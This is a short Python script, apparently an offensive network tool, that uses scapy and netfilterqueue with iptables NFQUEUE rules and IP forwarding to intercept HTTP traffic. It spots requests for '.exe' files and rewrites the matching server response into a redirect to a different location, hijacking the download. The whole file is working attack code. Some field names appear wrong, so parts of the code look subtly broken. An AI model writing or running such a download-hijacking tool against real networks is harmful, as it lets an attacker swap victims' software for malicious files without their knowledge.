#!/usr/bin/env python 

#iptables --flush 
#iptables -I INPUT -j NFQUEUE --queue-num 0
#iptables -I FORWARD -j NFQUEUE --queue-num 0

#echo 1 > /proc/sys/net/ipv4/ip_forward

import scapy.all as scapy
import netfilterqueue
import optparse

ack_list = []

def set_load(packet, load):
    packet[scapy.Raw].load = load
    # Recalculate checksums and lengths
    del packet[scapy.IP].len
    del packet[scapy.IP].checksum
    del packet[scapy.TCP].checksum
    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())  
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:  # HTTP request
            if b".exe" in scapy_packet[scapy.Raw].load:  # Look for ".exe" in the payload
                print("[+] exe Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)
        elif scapy_packet[scapy.TCP].sport == 80:  # HTTP response
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file")
                modified_packet = set_load(scapy_packet, b"HTTP/1.1 301 Moved Permanently\nLocation: https://www.example.org/index.asp\n\n")
                
                packet.set_payload(bytes(modified_packet))  
    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
